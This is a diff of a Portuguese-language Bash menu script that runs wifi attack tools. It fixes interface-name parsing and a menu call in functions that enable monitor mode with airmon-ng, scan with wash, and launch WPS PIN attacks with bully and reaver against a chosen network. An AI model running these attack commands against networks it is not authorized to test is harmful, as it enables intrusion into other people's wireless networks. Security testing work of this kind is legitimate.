@@ -356,9 +356,9 @@ MenuNmap_func() {
 
 airmonstop_func() {
 
-  echo -e ${Vd}"DESABILITANDO A PLACA DE REDE DO MODO ${LAN}mon"${Fm}
+  echo -e ${Vd}"DESABILITANDO A PLACA DE REDE DO MODO MONITOR"${Fm}
   sleep 2s
-  sudo airmon-ng stop ${LAN}mon
+  sudo airmon-ng stop ${LAN%%:*}mon
   thanks_func
 }
 
@@ -366,14 +366,14 @@ airmon_func() {
 
   clear
 
-  IFS=':' read LAN <<< $(sudo ifconfig | grep 'wl' | awk '{print $1}')
+  read LAN <<< $( sudo ifconfig | grep 'wl' )
 
   echo -e ${Rd}"COLOCANDO A PLACA WIFI EM MODO MONITOR"${Fm}
   sleep 3s
-  sudo airmon-ng start ${LAN} && clear
+  sudo airmon-ng start ${LAN%%:*} && clear
   echo -e ${Rd}"OBTENDO REDES WIFI DISPONIVEIS, O PROCESSO LEVARÁ 30 SEGUNDOS\n"${Fm}
   sleep 2s
-  sudo timeout --preserve-status 30 wash -i ${LAN}mon 
+  sudo timeout --preserve-status 30 wash -i ${LAN%%:*}mon 
   read -p $'\033[31;1m\nCOPIE E COLE O MAC DA REDE ESCOLHIDA R: \033[m' mac
   read -p $'\033[31;1m\nDIGITE O CANAL QUE CORRESPONDE AO MAC DA REDE ESCOLHIDA R: \033[m' canal
   echo -e ${Cy}"\nESTE PROCESSO PODE DEMORAR VÁRIOS MINUTOS\nAGUARDE O FIM DO PROCESSO...\n"${Fm}
@@ -382,7 +382,7 @@ airmon_func() {
 bully_func() {
 
   airmon_func
-  bully ${LAN}mon -b$mac -c$canal -d -A -F -B -l 5
+  bully ${LAN%%:*}mon -b$mac -c$canal -d -A -F -B -l 5
   echo -e ${Rd}"RETORNAR?"${Fm}${Rd} "[${Fm}${Br}S/N${Fm}${Rd}]"${Fm}
   read -p $'\033[1;37mR: \033[m' RES
 
@@ -392,11 +392,11 @@ bully_func() {
 reaver_func() {
 
   airmon_func
-  reaver -c$canal -b$mac -vv -i ${LAN}mon -L -Z -K 1
+  reaver -c$canal -b$mac -vv -i ${LAN%%:*}mon -L -Z -K 1
   echo -e ${Rd}"RETORNAR?"${Fm}${Rd} "[${Fm}${Br}S/N${Fm}${Rd}]"${Fm}
   read -p $'\033[1;37mR: \033[m' RES
 
-  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${LAN}
+  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${LAN%%:*}
 }
 
 MenuWificrack_func() {
@@ -434,7 +434,7 @@ MenuWificrack_func() {
       esac
     fi
 
-    [[ "${inicio,,}" == @(s|sim) ]] && MenuReaver_func || exit_func
+    [[ "${inicio,,}" == @(s|sim) ]] && MenuWificrack_func || exit_func
   
   done
 
